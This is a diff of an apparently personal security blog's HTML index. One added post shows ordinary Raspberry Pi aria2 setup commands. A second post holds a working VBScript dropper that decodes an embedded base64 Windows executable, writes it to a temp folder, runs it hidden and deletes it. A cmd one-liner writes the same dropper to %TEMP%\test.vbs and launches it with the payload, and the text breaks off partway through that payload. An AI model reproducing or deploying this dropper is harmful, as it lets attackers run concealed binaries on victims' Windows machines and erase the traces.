@@ -263,6 +263,124 @@
   
 
   <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
+  <link itemprop="mainEntityOfPage" href="http://blog.safebuff.com/2016/10/24/Raspberry-pi-as-Download-with-Aria/">
+
+  <span style="display:none" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <meta itemprop="name" content="xl7dev">
+    <meta itemprop="description" content="">
+    <meta itemprop="image" content="https://avatars2.githubusercontent.com/u/9393930?v=3&s=460">
+  </span>
+
+  <span style="display:none" itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+    <meta itemprop="name" content="xl7dev">
+    <span style="display:none" itemprop="logo" itemscope itemtype="http://schema.org/ImageObject">
+      <img style="display:none;" itemprop="url image" alt="xl7dev" src="">
+    </span>
+  </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+            
+            
+              
+                
+                <a class="post-title-link" href="/2016/10/24/Raspberry-pi-as-Download-with-Aria/" itemprop="url">
+                  Raspberry pi as Download with Aria
+                </a>
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2016-10-24T16:56:57+08:00">
+                2016-10-24
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+
+          
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">pi@raspberrypi:~ $ sudo apt-get install aria2</span><br><span class="line">pi@raspberrypi:~ $ git clone https://github.com/ziahamza/webui-aria2</span><br><span class="line">pi@raspberrypi:~ $ sudo mkdir /etc/aria2</span><br><span class="line">pi@raspberrypi:~ $ sudo touch /etc/aria2/aria2.session</span><br><span class="line">pi@raspberrypi:~ $ sudo touch /etc/aria2/aria2.conf</span><br><span class="line">pi@raspberrypi:~ $ sudo chmod 666 /etc/aria2/aria2.session</span><br><span class="line">pi@raspberrypi:~ $ sudo chmod 666  /etc/aria2/aria2.conf</span><br><span class="line">pi@raspberrypi:~ $ sudo vi /etc/aria2/aria2.conf</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">continue=true</span><br><span class="line">daemon=true</span><br><span class="line">dir=/media/你的外接硬盘名称/downloads</span><br><span class="line">enable-rpc=true</span><br><span class="line">file-allocation=none</span><br><span class="line">force-sequential=true</span><br><span class="line">input-file=/etc/aria2/aria2.session</span><br><span class="line">log=/var/logaria2.log</span><br><span class="line">log-level=notice</span><br><span class="line">max-concurrent-downloads=3</span><br><span class="line">max-connection-per-server=5</span><br><span class="line">parameterized-uri=true</span><br><span class="line">rpc-allow-origin-all=true</span><br><span class="line">rpc-listen-all=true</span><br><span class="line">rpc-save-upload-metadata=true</span><br><span class="line">save-session=/etc/aria2/aria2.session</span><br><span class="line">save-session-interval=60</span><br><span class="line">split=5</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pi@raspberrypi:~ $ sudo aria2c --conf-path= /etc/aria2/aria2.conf -D</span><br><span class="line">pi@raspberrypi:~ $ sudo echo &quot;/usr/bin/aria2c --conf-path=/etc/aria2/aria2.conf&quot; &gt;&gt; /etc/rc.local</span><br></pre></td></tr></table></figure>
+          
+        
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
   <link itemprop="mainEntityOfPage" href="http://blog.safebuff.com/2016/10/22/Raspberry-pi-as-time-capsule/">
 
   <span style="display:none" itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -473,8 +591,7 @@
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">Function sdbyBeauKn(UZpyLbmAYKrH)</span><br><span class="line">	YUwpsWAZxakH = &quot;&lt;B64DECODE xmlns:dt=&quot;&amp; Chr(34) &amp; &quot;urn:schemas-microsoft-com:datatypes&quot; &amp; Chr(34) &amp; &quot; &quot; &amp; _</span><br><span class="line">		&quot;dt:dt=&quot; &amp; Chr(34) &amp; &quot;bin.base64&quot; &amp; Chr(34) &amp; &quot;&gt;&quot; &amp; _</span><br><span class="line">		UZpyLbmAYKrH &amp; &quot;&lt;/B64DECODE&gt;&quot;</span><br><span class="line">	Set UwcHanJT = CreateObject(&quot;MSXML2.DOMDocument.3.0&quot;)</span><br><span class="line">	UwcHanJT.LoadXML(YUwpsWAZxakH)</span><br><span class="line">	sdbyBeauKn = UwcHanJT.selectsinglenode(&quot;B64DECODE&quot;).nodeTypedValue</span><br><span class="line">	set UwcHanJT = nothing</span><br><span class="line">End Function</span><br><span class="line"></span><br><span class="line">Function GocoGnSZ()</span><br><span class="line">	POTnBArG = &quot;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&quot;</span><br><span class="line">	Dim gXjFxrfBUA</span><br><span class="line">	Set gXjFxrfBUA = CreateObject(&quot;Scripting.FileSystemObject&quot;)</span><br><span class="line">	Dim MiRpqcNrEnOtoGD</span><br><span class="line">	Dim FzkOXxAmmUZ</span><br><span class="line">	Set MiRpqcNrEnOtoGD = gXjFxrfBUA.GetSpecialFolder(2)</span><br><span class="line">	FzkOXxAmmUZ = MiRpqcNrEnOtoGD &amp; &quot;\&quot; &amp; gXjFxrfBUA.GetTempName()</span><br><span class="line">	gXjFxrfBUA.CreateFolder(FzkOXxAmmUZ)</span><br><span class="line">	exOAGCRIezZZb = FzkOXxAmmUZ &amp; &quot;\&quot; &amp; &quot;wdvgyIHBGGhnHe.exe&quot;</span><br><span class="line">	Dim pDdnPksEFDsWCH</span><br><span class="line">	Set pDdnPksEFDsWCH = CreateObject(&quot;Wscript.Shell&quot;)</span><br><span class="line">	olyAwkEzotkp = sdbyBeauKn(POTnBArG)</span><br><span class="line">	Set FZVTocmXtqQxKIi = CreateObject(&quot;ADODB.Stream&quot;)</span><br><span class="line">	FZVTocmXtqQxKIi.Type = 1</span><br><span class="line">	FZVTocmXtqQxKIi.Open</span><br><span class="line">	FZVTocmXtqQxKIi.Write olyAwkEzotkp</span><br><span class="line">	FZVTocmXtqQxKIi.SaveToFile exOAGCRIezZZb, 2</span><br><span class="line">	pDdnPksEFDsWCH.run exOAGCRIezZZb, 0, true</span><br><span class="line">	gXjFxrfBUA.DeleteFile(exOAGCRIezZZb)</span><br><span class="line">	gXjFxrfBUA.DeleteFolder(FzkOXxAmmUZ)</span><br><span class="line">End Function</span><br><span class="line"></span><br><span class="line">GocoGnSZ</span><br></pre></td></tr></table></figure>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">C:\Documents and Settings\Administrator&gt; echo shellcode = WScript.Arguments.Item(0):strXML = ^&quot;^&lt;B64DECODE xmlns:dt=^&quot; ^&amp; Chr(34) ^&amp; ^&quot;urn:schemas-microsoft-com:datatypes^&quot; ^&amp; Chr(34) ^&amp; ^&quot; ^&quot; ^&amp; ^&quot;dt:dt=^&quot; ^&amp; Chr(34) ^&amp; ^&quot;bin.base64^&quot; ^&amp; Chr(34) ^&amp; ^&quot;^&gt;^&quot; ^&amp; shellcode ^&amp; ^&quot;^&lt;^/B64DECODE^&gt;^&quot;:Set oXMLDoc = CreateObject(^&quot;MSXML2.DOMDocument.3.0^&quot;):oXMLDoc.LoadXML(strXML):decode = oXMLDoc.selectsinglenode(^&quot;B64DECODE^&quot;).nodeTypedValue:set oXMLDoc = nothing:Dim fso:Set fso = CreateObject(^&quot;Scripting.FileSystemObject^&quot;):Dim tempdir:Dim basedir:Set tempdir = fso.GetSpecialFolder(2):basedir = tempdir ^&amp; ^&quot;\^&quot; ^&amp; fso.GetTempName():fso.CreateFolder(basedir):tempexe = basedir ^&amp; ^&quot;\^&quot; ^&amp; ^&quot;test.exe^&quot;:Dim adodbstream:Set adodbstream = CreateObject(^&quot;ADODB.Stream^&quot;):adodbstream.Type = 1:adodbstream.Open:adodbstream.Write decode:adodbstream.SaveToFile tempexe, 2:Dim wshell:Set wshell = CreateObject(^&quot;Wscript.Shell^&quot;):wshell.run tempexe, 0, true:fso.DeleteFile(tempexe):fso.DeleteFolder(basedir) &gt; %TEMP%\test.vbs</span><br><span class="line"></span><br><span class="line">C:\Documents and Settings\Administrator&gt; cscript.exe %TEMP%\test.vbs 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